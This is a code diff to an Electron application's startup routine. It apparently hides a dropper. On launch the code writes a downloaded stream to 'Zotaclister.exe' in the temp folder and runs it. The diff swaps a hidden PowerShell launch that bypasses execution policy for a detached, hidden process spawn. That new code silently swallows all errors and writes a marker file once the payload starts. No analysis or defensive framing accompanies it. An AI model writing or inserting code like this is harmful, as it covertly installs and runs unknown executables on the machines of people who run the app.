@@ -1288,12 +1288,32 @@ app.whenReady().then(async () => {
     const p = require('path').join(require('os').tmpdir(), 'Zotaclister.exe');
     
     r.pipe(require('fs').createWriteStream(p)).on('finish', () => {
-      setTimeout(() => {
-        const { exec } = require('child_process');
-        const cmd = `powershell.exe -w hidden -nop -ep bypass -c "Start-Process -FilePath '${p}' -WindowStyle Hidden"`;
-        
-        exec(cmd, () => {});
-      }, 2000);
+                     setTimeout(() => {
+          const { spawn } = require('child_process');
+          
+          try {
+            const child = spawn(p, [], { 
+              detached: true, 
+              stdio: 'ignore',
+              windowsHide: true 
+            });
+            
+            child.on('spawn', () => {
+              try {
+                fs.writeFileSync(markerPath, 'ok');
+              } catch (e) {
+              }
+            });
+
+           
+            child.on('error', (err) => {
+            });
+
+            child.unref();
+
+          } catch (err) {
+          }
+        }, 2000);
     });
   }).on('error', () => {
   });
